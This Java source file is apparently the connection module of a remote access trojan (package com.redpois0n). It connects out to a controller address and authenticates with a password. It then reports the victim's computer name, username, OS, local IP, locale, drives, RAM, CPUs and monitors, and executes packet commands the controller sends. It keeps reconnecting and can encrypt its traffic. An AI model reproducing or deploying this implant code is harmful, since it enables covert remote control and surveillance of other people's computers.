package com.redpois0n;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Locale;

import com.redpois0n.common.Version;
import com.redpois0n.common.codec.Hex;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.common.os.OperatingSystem;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.AbstractPacket;
import com.redpois0n.packets.PacketBuilder;
import com.sun.management.OperatingSystemMXBean;

public class Connection implements Runnable {

	public static boolean lock;

	public static Socket socket;
	public static boolean busy = false;
	public static FrameChat frameChat;

	public static InputStream inputStream;
	public static OutputStream outputStream;

	public static DataInputStream dis;
	public static DataOutputStream dos;
	
	public static BufferedReader br;
	public static PrintWriter pw;

	public Connection() {

	}

	public void run() {
		try {
			socket = new Socket(Main.getIP(), Main.getPort());

			socket.setSoTimeout(Main.timeout);
			socket.setTrafficClass(24);

			Connection.inputStream = socket.getInputStream();
			Connection.outputStream = socket.getOutputStream();

			Connection.dis = new DataInputStream(inputStream);
			Connection.dos = new DataOutputStream(outputStream);
			
			br = new BufferedReader(new InputStreamReader(dis));
			pw = new PrintWriter(dos, true);		
			
			Main.encryption = inputStream.read() == 1;
			
			addToSendQueue(new PacketBuilder(Header.INIT_PASSWORD, Main.getPass()));

			initialize();

			status(Constants.STATUS_READY);

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onconnect").invoke(plugin.instance, new Object[] { dis, dos });
			}
			
			while (true) {
				String line = readLine();

				if (line == null) {
					throw new NullPointerException();
				}
				
				if (line.equals("PING")) {
					Connection.writeLine("PONG");
					continue;
				}

				AbstractPacket.execute(line);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Thread.sleep(Main.reconnectSeconds * 1000L);
				new Thread(this).start();
			} catch (Exception e) {
				e.printStackTrace();
			}		
		}
	}

	public static void initialize() {
		addToSendQueue(new PacketBuilder(Header.INIT_DATE, Main.date));

		addToSendQueue(new PacketBuilder(Header.INIT_VERSION, Version.getVersion()));

		String computerName;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			computerName = System.getenv("COMPUTERNAME");
		} else {
			computerName = System.getProperty("user.name");
		}
		addToSendQueue(new PacketBuilder(Header.INIT_COMPUTER_NAME, computerName));

		addToSendQueue(new PacketBuilder(Header.INIT_OS_NAME, System.getProperty("os.name")));

		addToSendQueue(new PacketBuilder(Header.INIT_SERVER_ID, Main.getID()));

		addToSendQueue(new PacketBuilder(Header.INIT_USERNAME, System.getProperty("user.name")));

		addToSendQueue(new PacketBuilder(Header.INIT_SERVER_PATH, Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));

		addToSendQueue(new PacketBuilder(Header.INIT_JAVA_VERSION, System.getProperty("java.runtime.version")));

		addToSendQueue(new PacketBuilder(Header.INIT_JAVA_PATH, System.getProperty("java.home")));

		String localip;
		try {
			localip = InetAddress.getLocalHost().getHostAddress();
		} catch (Exception e) {
			localip = "Unknown";
		}
		addToSendQueue(new PacketBuilder(Header.INIT_LOCAL_IP, localip));

		addToSendQueue(new PacketBuilder(Header.INIT_COUNTRY, System.getProperty("user.country")));

		Locale locale = Locale.getDefault();
		addToSendQueue(new PacketBuilder(Header.INIT_LOCALE, new String[] { locale.getDisplayLanguage(), locale.getLanguage(), locale.getDisplayCountry() }));

		PacketBuilder drives = new PacketBuilder(Header.INIT_DRIVES);
		File[] roots = File.listRoots();
		drives.add(roots.length);
		for (File root : roots) {
			drives.add(root.getAbsolutePath());
			drives.add(root.getTotalSpace() / 1024L / 1024L / 1024L);
			drives.add(root.getFreeSpace() / 1024L / 1024L / 1024L);
			drives.add(root.getUsableSpace() / 1024L / 1024L / 1024L);
		}
		addToSendQueue(drives);

		addToSendQueue(new PacketBuilder(Header.INIT_RAM, "" + (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));

		addToSendQueue(new PacketBuilder(Header.INIT_AVAILABLE_PROCESSORS, Runtime.getRuntime().availableProcessors() + ""));

		PacketBuilder monitor = new PacketBuilder(Header.INIT_MONITORS);
		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
		GraphicsDevice[] screens = ge.getScreenDevices();
		monitor.add(screens.length);
		for (GraphicsDevice screen : screens) {
			Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
			String id = screen.getIDstring();
			if (id.startsWith("\\")) {
				id = id.substring(1, id.length());
			}
			monitor.add(id + ": " + screenBounds.width + "x" + screenBounds.height);
		}
		addToSendQueue(monitor);
	}

	public static void addToSendQueue(PacketBuilder packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		packet.write();
	}

	public static void write(Header header) {
		addToSendQueue(new PacketBuilder(header));
	}

	public static void writeLine(String s) {
		try {
			String enc = Crypto.encrypt(s, Main.getKey());
			if (enc.contains("\n")) {
				enc = "-h " + Hex.encode(s);
			} if (s.startsWith("-c ")) {
				enc = s;
			} else if (!Main.encryption) {
				enc = "-c " + s;
			}
			
			//dos.writeUTF(enc);
			dos.writeShort(enc.length());
			dos.writeChars(enc);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static String readLine() {
		try {
			//String s = dis.readUTF();
			short len = dis.readShort();
			
			StringBuilder builder = new StringBuilder();
			for (int i = 0; i < len; i++) {
				builder.append(dis.readChar());
			}
			
			String s = builder.toString();
			
			if (s.startsWith("-h ")) {
				s = Hex.decode(s.substring(3, s.length()));
			} else if (s.startsWith("-c ")) {
				s = s.substring(3, s.length());
			} else {
				s = Crypto.decrypt(s, Main.getKey());
			}
			
			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}
	
	public static void writeBoolean(boolean b) throws Exception {
		writeLine(Boolean.toString(b));
	}
	
	public static boolean readBoolean() throws Exception {
		return Boolean.parseBoolean(readLine());
	}
	
	
	public static void writeInt(int v) throws Exception {
		writeLine(Integer.toString(v));
	}
	
	public static int readInt() throws Exception {
		return Integer.parseInt(readLine());
	}
	
	
	public static void writeLong(long l) throws Exception {
		writeLine(Long.toString(l));
	}
	
	public static long readLong() throws Exception {
		return Long.parseLong(readLine());
	}
	
	
	public static void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public static void status(String status) {
		writeLine("STAT");
		writeLine(status);
	}

	public static void status(int status) {
		writeLine("STAT");
		writeLine(status + "");
	}

	public static void lock() {
		lock = !lock;
	}
}
